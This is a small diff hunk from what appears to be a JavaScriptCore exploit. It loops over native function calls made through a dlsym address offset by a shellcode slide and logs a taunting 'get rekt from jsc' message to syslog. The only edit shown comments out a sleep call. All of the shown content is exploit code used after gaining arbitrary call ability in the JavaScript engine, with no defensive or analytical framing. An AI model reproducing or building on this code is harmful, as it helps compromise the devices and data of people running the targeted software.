@@ -69,7 +69,7 @@ function main() {
 //		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, i, slide);
 //		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 1, 0x1, 0x2, 0x3);
 		calls4arg("syslog\0", 0x28, sptr("get rekt from jsc %d (slide=%x)\n\0"), i, 0);
-		calls4arg("sleep", 1, 0, 0, 0);
+//		calls4arg("sleep", 1, 0, 0, 0);
 		i++;
 //		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x148000, i, 0x2, 0x3);
 	}
